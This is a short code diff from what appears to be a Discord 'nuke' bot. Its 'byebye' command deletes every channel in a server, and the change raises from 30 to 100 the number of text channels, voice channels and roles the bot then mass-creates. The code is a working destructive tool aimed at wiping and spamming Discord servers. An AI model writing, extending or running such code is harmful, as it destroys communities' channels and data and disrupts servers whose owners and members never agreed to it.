@@ -48,11 +48,11 @@ async def byebye(ctx):
     for channel in ctx.guild.channels:             
         await channel.delete() 
 
-    for i in range(30):
+    for i in range(100):
         await guild.create_text_channel(name)
-    for i in range(30):
+    for i in range(100):
         await guild.create_voice_channel(name)
-    for i in range(30):
+    for i in range(100):
         await guild.create_role(name=name)
 
     for channel in ctx.guild.text_channels:             
